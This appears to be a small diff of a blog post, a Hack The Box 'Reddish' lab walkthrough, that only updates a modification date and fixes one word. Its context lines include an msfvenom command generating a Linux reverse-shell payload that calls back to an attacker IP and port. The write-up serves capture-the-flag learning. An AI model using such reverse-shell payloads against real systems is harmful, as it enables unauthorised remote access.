@@ -3,7 +3,7 @@ layout: post
 title: "Reddish: Hack The Box Walkthrough"
 subtitle: "Red goes with everything and red goes with nothing."
 date: 2019-01-27 02:18:27 +0000
-last_modified_at: 2019-01-27 02:24:30 +0000
+last_modified_at: 2019-02-09 09:30:07 +0000
 category: Walkthrough
 tags: ["Hack The Box", Reddish, retired]
 comments: true
@@ -75,7 +75,7 @@ That's why I spun off another reverse shell with `msfvenom`.
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.13.52 LPORT=9999 -f elf -o rev
 ```
 
-Next, I've to find a more efficient way of transferring files over to the remote target. To that end, I wrote a `wget` utility in Node.js since `node` and the `request` module are available. The script has two arguments: the first argument is the download URL and the second argument is the path to save the file.
+Next, I've to find a more efficient way of transferring files over to the remote target. To that end, I wrote a `wget` utility in Node.js since `node` and the `request` modules are available. The script has two arguments: the first argument is the download URL and the second argument is the path to save the file.
 
 <div class="filename"><span>wget.js</span></div>
 
